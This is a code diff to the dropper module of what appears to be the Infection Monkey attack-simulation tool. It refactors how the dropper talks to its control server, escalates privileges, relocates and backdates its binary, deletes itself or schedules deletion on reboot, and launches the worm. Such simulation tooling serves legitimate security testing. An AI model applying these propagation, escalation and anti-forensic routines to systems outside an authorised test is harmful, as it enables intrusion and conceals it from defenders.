@@ -1,7 +1,6 @@
 import ctypes
 import logging
 import os
-import pprint
 import sys
 import time
 from ctypes import c_char_p
@@ -11,7 +10,11 @@ from infection_monkey.telemetry.attack.t1106_telem import T1106Telem
 from common.utils.attack_utils import ScanStatus, UsageEnum
 from infection_monkey.utils.startup.flag_analyzer import FlagAnalyzer
 from infection_monkey.utils.startup.file_mover import FileMover
+from infection_monkey.utils.startup.island_communicator import CommunicatorWithIsland
 from infection_monkey.utils.startup.process_detacher import MonkeyProcessDetacher
+from infection_monkey.model import DROPPER_ARG
+from infection_monkey.privilege_escalation.pe_handler import PrivilegeEscalation
+from infection_monkey.monkey import InfectionMonkey
 
 
 # Linux doesn't have WindowsError
@@ -29,70 +32,68 @@ MOVE_FILE_DELAY_UNTIL_REBOOT = 4
 DELAY_BEFORE_EXITING = 3
 
 
-class MonkeyDrops(object):
+class MonkeyDrops(CommunicatorWithIsland):
+
     def __init__(self, args):
         self._flags = FlagAnalyzer.get_flags(args)
-        self._default_server = None
-        self._default_server_port = None
-        self._config = {'source_path': os.path.abspath(sys.argv[0]),
-                        'destination_path': self._flags.location}
-
-    def initialize(self):
-        LOG.debug("Dropper is running with config:\n%s", pprint.pformat(self._config))
-        self._default_server = self._flags.server
-        try:
-            self._default_server_port = self._default_server.split(':')[1]
-        except KeyError:
-            self._default_server_port = ''
-
-        if self._default_server:
-            if self._default_server not in WormConfiguration.current_server:
-                LOG.debug("Added current server: %s" % self._default_server)
-                WormConfiguration.current_server = self._default_server
-            else:
-                LOG.debug("Default server: %s is already in command servers list" % self._default_server)
+        super().__init__(default_server=self._flags.server, tunnel=self._flags.tunnel)
+        self._file_source_path = os.path.abspath(sys.argv[0])
+        self._file_destination_path = self._flags.location
 
     def start(self):
-        if self._config['destination_path'] is None:
-            LOG.error("No destination path specified")
-            return False
+        if self._flags.mode == DROPPER_ARG:
+            MonkeyProcessDetacher(self._flags, self._file_source_path).detach_process()
 
-        FileMover.move_file(self._config['source_path'], self._config['destination_path'])
+        self.load_configuration_from_island()
 
-        if WormConfiguration.dropper_set_date:
-            self._set_date()
+        if not self._flags.escalated:
+            if PrivilegeEscalation(self._file_source_path, self._flags).execute():
+                return
 
-        monkey_process = MonkeyProcessDetacher(self._flags, self._config['destination_path']).detach_process()
+        if self._file_destination_path is not None:
+            file_moved = FileMover.move_file(self._file_source_path, self._file_destination_path)
+            if file_moved:
+                if WormConfiguration.dropper_set_date:
+                    self._set_date()
+                MonkeyProcessDetacher(self._flags, self._file_destination_path).detach_process()
+                time.sleep(DELAY_BEFORE_EXITING)
+                self.cleanup()
+                return
 
-        time.sleep(DELAY_BEFORE_EXITING)
-        if monkey_process.poll() is not None:
-            LOG.warning("Seems like monkey died too soon")
+        self.run_monkey()
 
     def cleanup(self):
         try:
-            if (self._config['source_path'].lower() != self._config['destination_path'].lower()) and \
-                    os.path.exists(self._config['source_path']) and \
+            if (self._file_source_path.lower() != self._file_destination_path.lower()) and \
+                    os.path.exists(self._file_source_path) and \
                     WormConfiguration.dropper_try_move_first:
 
                 # try removing the file first
                 try:
-                    # TODO uncomment os.remove(self._config['source_path'])
+                    os.remove(self._file_source_path)
                     print()
                 except Exception as exc:
-                    LOG.debug("Error removing source file '%s': %s", self._config['source_path'], exc)
+                    LOG.debug("Error removing source file '%s': %s", self._file_source_path, exc)
 
                     # mark the file for removal on next boot
-                    dropper_source_path_ctypes = c_char_p(self._config['source_path'])
+                    dropper_source_path_ctypes = c_char_p(self._file_source_path)
                     if 0 == ctypes.windll.kernel32.MoveFileExA(dropper_source_path_ctypes, None,
                                                                MOVE_FILE_DELAY_UNTIL_REBOOT):
                         LOG.debug("Error marking source file '%s' for deletion on next boot (error %d)",
-                                  self._config['source_path'], ctypes.windll.kernel32.GetLastError())
+                                  self._file_source_path, ctypes.windll.kernel32.GetLastError())
                     else:
                         LOG.debug("Dropper source file '%s' is marked for deletion on next boot",
-                                  self._config['source_path'])
+                                  self._file_source_path)
                         T1106Telem(ScanStatus.USED, UsageEnum.DROPPER_WINAPI).send()
         except AttributeError:
             LOG.error("Invalid configuration options. Failing")
+
+    def run_monkey(self):
+        monkey = InfectionMonkey(self._flags)
+        try:
+            monkey.start()
+        finally:
+            monkey.cleanup()
 
     def _set_date(self):
         if sys.platform == 'win32':
@@ -106,6 +107,6 @@ class MonkeyDrops(object):
                         dropper_date_reference_path)
         else:
             try:
-                os.utime(self._config['destination_path'], (ref_stat.st_atime, ref_stat.st_mtime))
+                os.utime(self._file_destination_path, (ref_stat.st_atime, ref_stat.st_mtime))
             except:
                 LOG.warning("Cannot set reference date to destination file")
